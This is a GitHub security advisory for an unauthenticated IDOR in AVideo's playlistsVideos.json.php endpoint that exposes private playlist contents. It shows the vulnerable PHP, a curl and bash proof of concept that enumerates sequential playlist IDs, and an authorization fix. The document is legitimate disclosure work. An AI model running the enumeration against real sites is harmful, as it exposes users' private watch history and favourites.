# [M] AVideo: Unauthenticated IDOR in playlistsVideos.json.php Exposes Private Playlist Contents

## Summary
Severity: Medium
Advisory: GHSA-75qq-68m8-pvfr
CVE: CVE-2026-33759
CWE: CWE-639, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-75qq-68m8-pvfr
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `objects/playlistsVideos.json.php` endpoint returns the full video contents of any playlist by ID without any authentication or authorization check. Private playlists (including `watch_later` and `favorite` types) are correctly hidden from listing endpoints via `playlistsFromUser.json.php`, but their contents are directly accessible through this endpoint by providing the sequential integer `playlists_id` parameter.

## Details

The endpoint at `objects/playlistsVideos.json.php` accepts a `playlists_id` parameter and directly calls `PlayList::getVideosFromPlaylist()` with no ownership or visibility validation:

```php
// objects/playlistsVideos.json.php:24-28
if (empty($_REQUEST['playlists_id'])) {
    die('Play List can not be empty');
}
require_once './playlist.php';
$videos = PlayList::getVideosFromPlaylist($_REQUEST['playlists_id']);
```

The `getVideosFromPlaylist()` method at `objects/playlist.php:588` performs a SQL query joining `playlists_has_videos`, `videos`, and `users` tables with no authorization filter:

```php
// objects/playlist.php:592-597
$sql = "SELECT v.*, p.*,v.created as cre, p.`order` as video_order  "
    . " FROM  playlists_has_videos p "
    . " LEFT JOIN videos as v ON videos_id = v.id "
    . " LEFT JOIN users u ON u.id = v.users_id "
    . " WHERE playlists_id = ? AND v.status != 'i' ";
```

In contrast, the listing endpoint `playlistsFromUser.json.php` correctly enforces visibility at lines 23-27:

```php
// objects/playlistsFromUser.json.php:23-27
$publicOnly = true;
if (User::isLogged() && (User::getId() == $requestedUserId || User::isAdmin())) {
    $publicOnly = false;
}
$row = PlayList::getAllFromUser($requestedUserId, $publicOnly);
```

This creates a bypass: even though private playlists are hidden from listing, their contents are fully exposed via the videos endpoint. Playlist IDs are sequential integers, making enumeration trivial. The `.htaccess` rewrite at line 356 maps the clean URL `playListsVideos.json` to this endpoint.

## PoC

**Step 1: Enumerate playlist contents without authentication**

```bash
# No cookies or auth headers needed. Increment playlists_id to enumerate.
curl -s "http://TARGET/objects/playlistsVideos.json.php?playlists_id=1" | python3 -m json.tool
```

Expected: Returns full video metadata array for playlist ID 1, including video titles, filenames, URLs, user info, comments, and subscriber counts.

**Step 2: Enumerate private playlists (watch_later, favorite)**

```bash
# Iterate through sequential IDs to find private playlists
for i in $(seq 1 50); do
  result=$(curl -s "http://TARGET/objects/playlistsVideos.json.php?playlists_id=$i")
  count=$(echo "$result" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)
  if [ "$count" != "0" ] && [ -n "$count" ]; then
    echo "Playlist $i: $count videos"
  fi
done
```

**Step 3: Confirm the listing endpoint correctly hides private playlists**

```bash
# This correctly returns only public playlists for user 1
curl -s "http://TARGET/objects/playlistsFromUser.json.php?users_id=1" | python3 -m json.tool
# Compare: playlistsVideos.json.php returns contents of ALL playlists including private ones
```

## Impact

An unauthenticated attacker can:

- **Enumerate all users' watch history** by accessing `watch_later` playlist contents
- **Enumerate all users' favorites** by accessing `favorite` playlist contents
- **Access unlisted/private custom playlists** that were intentionally hidden from public view
- **Harvest video metadata** including filenames, URLs, user information, and comments for videos in private playlists

This is a privacy violation that exposes user viewing habits and content preferences. The sequential integer IDs make bulk enumeration straightforward.

## Recommended Fix

Add authorization checks to `objects/playlistsVideos.json.php` before returning playlist contents:

```php
// objects/playlistsVideos.json.php — add after line 27, before getVideosFromPlaylist()
require_once $global['systemRootPath'] . 'plugin/PlayLists/PlayLists.php';

$pl = new PlayList($_REQUEST['playlists_id']);
$plStatus = $pl->getStatus();

// Public playlists are accessible to everyone
if ($plStatus !== 'public') {
    // Private, unlisted, watch_later, and favorite playlists require ownership or admin
    if (!User::isLogged() || (User::getId() != $pl->getUsers_id() && !User::isAdmin())) {
        header('HTTP/1.1 403 Forbidden');
        die(json_encode(['error' => 'You do not have permission to view this playlist']));
    }
}

$videos = PlayList::getVideosFromPlaylist($_REQUEST['playlists_id']);
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-75qq-68m8-pvfr
- https://nvd.nist.gov/vuln/detail/CVE-2026-33759
- https://github.com/WWBN/AVideo/commit/bb716fbece656c9fe39784f11e4e822b5867f1ca
- https://github.com/WWBN/AVideo
